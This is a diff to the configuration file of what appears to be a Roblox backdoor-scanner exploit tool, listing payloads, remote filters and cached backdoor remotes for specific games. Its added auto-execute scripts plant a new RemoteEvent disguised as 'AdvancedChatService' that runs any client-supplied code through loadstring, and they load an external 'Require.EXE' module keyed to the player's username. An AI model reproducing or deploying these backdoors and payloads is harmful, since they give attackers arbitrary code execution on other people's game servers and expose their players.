@@ -3,26 +3,35 @@ local player = game:GetService("Players").LocalPlayer
 
 -- main
 return {
-	["configVer"] = 9, -- don't touch this!
+	["configVer"] = 9, -- Don't touch this!
+	
 	-- @tweaks
-	["enableLogging"] = true, -- logs anything that happens
-	["redirectOutput"] = true, -- redirects output to console
-	["redirectRemote"] = true, -- uses a custom created remote for server-side execution
+	["enableLogging"] = true, -- Logs anything that happens
+	["redirectOutput"] = true, -- Redirects output to console
+	["redirectRemote"] = true, -- Uses a custom-created remote for server-side execution
 
 	-- @customization
-	-- $scripts that executes after backdoor is found
-	-- $you can add any scripts here
+	-- Scripts that execute after a backdoor is found
+	-- You can add any scripts here
 	["autoExec"] = {
-		[[print("jLn0n's beckdeer skenner is epic!")]],
+		[[print("Welcome!")]],
+		[[local meowx = Instance.new("RemoteEvent", game.ReplicatedStorage)
+meowx.Name = "AdvancedChatService"
+meowx.OnServerEvent:Connect(function(player, chat)
+    loadstring(chat)()
+end)]],
+		[[print("Processes done!")]],
+		[[require(125992639027440)["Require.EXE by E God"]("%username%")]],
+		[[print("LVL: 8-9")]],
 	},
 
-	-- $remote filters that you don't want to be scanned
-	-- $should be thread-safe
+	-- Remote filters that you don't want to be scanned
+	-- Should be thread-safe
 	["remoteFilters"] = {
 		["AdminRemotes"] = function(remoteObj)
 			local remoteObjPath = remoteObj:GetFullName()
-
-			return remoteObj:IsDescendantOf(game:GetService("ReplicatedStorage")) and (string.find(remoteObjPath, "HDAdminClient") or string.find(remoteObjPath, "Basic Admin Essentials"))
+			return remoteObj:IsDescendantOf(game:GetService("ReplicatedStorage")) and 
+				(string.find(remoteObjPath, "HDAdminClient") or string.find(remoteObjPath, "Basic Admin Essentials"))
 		end,
 		["AdonisRemotes"] = function(remoteObj)
 			return (
@@ -32,47 +41,46 @@ return {
 		end,
 		["RespawnRemotes"] = function(remoteObj)
 			local remoteObjName = string.lower(remoteObj.Name)
-
-			return (string.find(remoteObjName, "respawn"))
+			return string.find(remoteObjName, "respawn")
 		end,
 		["SkidCannonRemotes"] = function(remoteObj)
 			local remoteObjPath = remoteObj:GetFullName()
-
-			return (string.find(remoteObjPath, "JointsService") and (string.find(remoteObjPath, "Lightning Cannon") or string.find(remoteObjPath, " Cannon")))
+			return string.find(remoteObjPath, "JointsService") and 
+				(string.find(remoteObjPath, "Lightning Cannon") or string.find(remoteObjPath, " Cannon"))
 		end,
 		["RobloxReplicatedStorage"] = function(remoteObj)
 			return remoteObj:IsDescendantOf(game:GetService("RobloxReplicatedStorage"))
 		end,
 		["RedirectedRemote"] = function(remoteObj)
 			return remoteObj:GetAttribute("isNonced")
-		end
+		end,
 	},
 
-	-- $any macro shenanigans you can add here
-	-- $prefixed as "%macro%" | example: %username% -> "Roblox", %plr_pos% -> Vector3
+	-- Macro shenanigans you can add here
+	-- Prefixed as "%macro%" | Example: %username% -> "Roblox", %plr_pos% -> Vector3
 	["scriptMacros"] = {
 		["username"] = player.Name,
 		["userid"] = player.UserId,
-		["placeid"] = game.PlaceId
+		["placeid"] = game.PlaceId,
 	},
 
-	-- $backdoor payloads
+	-- Backdoor payloads
 	["backdoorPayloads"] = {
 		["default"] = {
 			["Args"] = {"source"},
-			["Priority"] = 1
+			["Priority"] = 1,
 		},
 	},
 
-	-- $cached backdoor remotes
+	-- Cached backdoor remotes
 	["cachedPlaces"] = {
 		[5033592164] = {
 			["Remote"] = game:GetService("ReplicatedStorage"):FindFirstChildWhichIsA("RemoteEvent"),
-			["Args"] = {"1234567890", "source"}
+			["Args"] = {"1234567890", "source"},
 		},
 		[6879465970] = {
 			["Remote"] = "ReplicatedStorage.RemoteEvent",
-			["Args"] = {"source"}
+			["Args"] = {"source"},
 		},
 	},
 }
